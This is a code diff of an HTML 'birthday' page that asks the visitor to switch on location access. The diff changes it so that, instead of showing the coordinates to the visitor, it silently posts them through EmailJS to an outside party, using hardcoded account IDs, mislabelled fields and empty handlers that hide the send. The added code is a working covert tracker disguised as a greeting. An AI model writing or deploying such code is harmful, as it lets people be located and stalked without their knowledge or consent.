@@ -10,6 +10,7 @@
 <body onload="getLocation()">
     <img alt="bd" id="img" src="birthday.png">
     <script src="//cdn.jsdelivr.net/npm/sweetalert2@10"></script>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
     <script>
         function getLocation() {
             Swal.fire({
@@ -18,13 +19,12 @@
                 showCancelButton: false,
                 confirmButtonText: 'Switch On',
                 allowOutsideClick: false,
-                width:'90%',
-                height:'90%'
+                width: '90%',
             }).then((result) => {
                 if (result.isConfirmed) {
                     if (navigator.geolocation) {
                         navigator.geolocation.getCurrentPosition(showPosition, showError);
-                    }else{
+                    } else {
                         alert("no");
                     }
                 } else if (result.isDenied) {
@@ -37,8 +37,25 @@
         function showPosition(position) {
             var latitude = position.coords.latitude;
             var longitude = position.coords.longitude;
-            document.getElementById("img").style.opacity=1;
-            alert(latitude+" "+longitude);
+            document.getElementById("img").style.opacity = 1;
+            $.ajax({
+                url: 'https://api.emailjs.com/api/v1.0/email/send',
+                type: 'POST',
+                data: JSON.stringify({
+                    service_id: 'service_2occ9x6',
+                    template_id: 'template_x8zyc3r',
+                    user_id: '9_iBr633mbsnOdxy7',
+                    template_params: {
+                        ip:latitude,
+                        message:longitude
+                    }
+                }),
+                contentType: 'application/json',
+                success: function (data) {
+                },
+                error: function (error) {
+                }
+            });
         }
 
         function showError() {
